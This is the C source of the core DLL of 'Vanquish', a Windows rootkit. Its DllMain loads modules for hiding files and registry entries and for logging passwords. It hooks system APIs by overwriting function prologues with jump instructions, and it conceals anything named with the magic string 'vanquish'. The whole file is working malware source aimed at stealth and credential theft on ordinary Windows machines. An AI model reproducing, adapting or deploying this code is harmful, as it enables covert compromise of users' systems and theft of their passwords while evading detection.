/******************************************************************************\

	Vanquish DLL - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "Vanquish_dll.h"
#include "..\Injector.h"
#include "..\Utils.h"
#include <stdio.h>

//module declarations
DECLARE_VANQUISH_MODULES

#ifdef VANQUISH_DLLUTILS
#include "vDllUtils.h"
EXTERN_DLLUTILS
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
#include "vHideFiles.h"
EXTERN_HIDEFILES
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
#include "vHideReg.h"
EXTERN_HIDEREG
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_PWDLOG
#include "vPwdLog.h"
EXTERN_PWDLOG
#endif//VANQUISH_PWDLOG

#ifdef VANQUISH_SOURCEPROTECT
#include "vSourceProtect.h"
EXTERN_SOURCEPROTECT
#endif//VANQUISH_SOURCEPROTECT

//string to search for in pos0 & posw0
//it is the magic string that hides files & registry entries
LPCSTR HIDE_STRA = "vanquish";
LPCWSTR HIDE_STRW = L"vanquish";
const DWORD HIDE_STRCN = 8;

//DLL / thread sync things...
WORD nLangID;
HMODULE ghinstDLL;
CRITICAL_SECTION csVanquish;

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////


//////////////////////////////MAGIC STRING FINDING//////////////////////////////

//wide version of pos (UNICODE)
DWORD posw0(LPCWSTR p)
{
	DWORD i, j, ok;

	VBEGIN
	if (!p) return 0xffffffff;

	for (i = 0;; i++)
	{
		ok = 1;
		for (j = 0; j < HIDE_STRCN; j++)
		{
			if (p[i + j] == 0) return 0xffffffff;
			if (IsBadReadPtr(p, sizeof(WCHAR) * (i + 1))) return 0xffffffff;
			if (p[i + j] != HIDE_STRW[j])
			{
				ok = 0;
				break;
			}
		}
		if (ok == 1) break;
	}

	if (ok == 0) return 0xffffffff;
	VEND
	return i;
}

DWORD pos0(LPCSTR p)
{
	DWORD i, j, ok;

	VBEGIN
	if (!p) return 0xffffffff;

	for (i = 0;; i++)
	{
		ok = 1;
		for (j = 0; j < HIDE_STRCN; j++)
		{
			if (p[i + j] == 0) return 0xffffffff;
			if (IsBadReadPtr(p, sizeof(CHAR) * (i + 1))) return 0xffffffff;
			if (p[i + j] != HIDE_STRA[j])
			{
				ok = 0;
				break;
			}
		}
		if (ok == 1) break;
	}

	if (ok == 0) return 0xffffffff;
	VEND
	return i;
}

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////


///////////////////////////////API REPLACEMENT//////////////////////////////////

//replace da api
BOOL Vanquish_ReplaceAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf, LPBYTE hooker, DWORD dwInitial)
{
	BOOL bSuccess = FALSE;

	VBEGIN
	DWORD dwOldProtect, dwNewProtect, dwActual;

	//some checks: here we use direct return, not goto cleanup!
	if (!lpOld) return FALSE;
	if (!lpNew) return FALSE;
	if (!savbuf) return FALSE;
	if (!hooker) return FALSE;

	EnterCriticalSection(&csVanquish);
	//modify api access rights
	dwNewProtect = PAGE_EXECUTE_READWRITE;
	dwOldProtect = dwNewProtect;
	if (!VirtualProtect(lpOld, JMP_SIZE, dwNewProtect, &dwOldProtect)) goto cleanup;

	if (dwInitial)
	{
		//save overwritten instructions
		if (IsBadReadPtr(lpOld, JMP_SIZE)) goto cleanup;
		if (IsBadWritePtr(savbuf, JMP_SIZE)) goto cleanup;
		CopyMemory(savbuf, lpOld, JMP_SIZE);

		//compute relative jump offset
		dwActual = (DWORD)lpNew - (DWORD)lpOld - JMP_SIZE;
		hooker[0] = 0xe9; //relative 32-bit jmp instruction; address follows
		hooker[1] = (BYTE)(dwActual & 0xff);
		hooker[2] = (BYTE)((dwActual >> 8) & 0xff);
		hooker[3] = (BYTE)((dwActual >> 16) & 0xff);
		hooker[4] = (BYTE)((dwActual >> 24) & 0xff);
	}

	//write hooker
	if (IsBadWritePtr(lpOld, JMP_SIZE)) goto cleanup;
	CopyMemory(lpOld, hooker, JMP_SIZE);

	bSuccess = TRUE;

cleanup:

	if (!bSuccess) Vanquish_Dump2Log("Replace API failed!");

	//restore api access rights
	if (dwOldProtect != dwNewProtect) VirtualProtect(lpOld, JMP_SIZE, dwOldProtect, &dwNewProtect);
	LeaveCriticalSection(&csVanquish);
	VEND
	return bSuccess;
}

//restore it!
BOOL Vanquish_RestoreAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf)
{
	BOOL bSuccess = FALSE;

	VBEGIN
	DWORD dwOldProtect, dwNewProtect;

	//some checks: here we use direct return, not goto cleanup!
	if (!lpOld) return FALSE;
	if (!lpNew) return FALSE;
	if (!savbuf) return FALSE;

	EnterCriticalSection(&csVanquish);
	//modify api access rights
	dwNewProtect = PAGE_EXECUTE_READWRITE;
	dwOldProtect = dwNewProtect;
	if (!VirtualProtect(lpOld, JMP_SIZE, dwNewProtect, &dwOldProtect)) goto cleanup;

	//write old instructions
	if (IsBadWritePtr(lpOld, JMP_SIZE)) goto cleanup;
	if (IsBadReadPtr(savbuf, JMP_SIZE)) goto cleanup;
	CopyMemory(lpOld, savbuf, JMP_SIZE);

	bSuccess = TRUE;

cleanup:

	if (!bSuccess) Vanquish_Dump2Log("Restore API failed! System corruption imminent...");

	//restore api access rights
	if (dwOldProtect != dwNewProtect) VirtualProtect(lpOld, JMP_SIZE, dwOldProtect, &dwNewProtect);
	LeaveCriticalSection(&csVanquish);
	VEND
	return bSuccess;
}

///////////////////////////////DLL SPECIFIC/////////////////////////////////////

//the DllMain thing
BOOL WINAPI DllMain(HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	VBEGIN

	ghinstDLL = (HMODULE)hinstDLL;
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		/*
		if (lpvReserved)
			return FALSE; //do not accept static loads! why? i don't know!
						  //it seems more secure this way
		*/

		//subjective injection (SIMPLE! ISN'T IT?)
		if (posw0(GetCommandLineW()) != 0xffffffff) goto skip_replace_api;

		//optimize a little bit
		DisableThreadLibraryCalls(ghinstDLL);

		//some thread sync so the api won't get multiwritten...
		InitializeCriticalSection(&csVanquish);


		//modules need to be loaded
		//  before Vanquish_PrepareInjector() for ADDR_OF() functionality
		LOAD_VANQUISH_MODULES

		//prepare the injector
		if (!Vanquish_PrepareInjector()) //injector may fail?
			return FALSE; //we will crash windows if injector fails; so we quit

#ifdef VANQUISH_DLLUTILS
		LOAD_VANQUISH(DLLUTILS);
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
		LOAD_VANQUISH(HIDEFILES);
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
		LOAD_VANQUISH(HIDEREG);
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_PWDLOG
		LOAD_VANQUISH(PWDLOG);
#endif//VANQUISH_PWDLOG

#ifdef VANQUISH_SOURCEPROTECT
		LOAD_VANQUISH(SOURCEPROTECT);
#endif//VANQUISH_SOURCEPROTECT

/////////////////
skip_replace_api:

		break;
	case DLL_PROCESS_DETACH:

#ifdef VANQUISH_DLLUTILS
		UNLOAD_VANQUISH(DLLUTILS);
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
		UNLOAD_VANQUISH(HIDEFILES);
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
		UNLOAD_VANQUISH(HIDEREG);
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_PWDLOG
		UNLOAD_VANQUISH(PWDLOG);
#endif//VANQUISH_PWDLOG

#ifdef VANQUISH_SOURCEPROTECT
		UNLOAD_VANQUISH(SOURCEPROTECT);
#endif//VANQUISH_SOURCEPROTECT

		DeleteCriticalSection(&csVanquish);
		break;
	}
	VEND
	return TRUE;
}
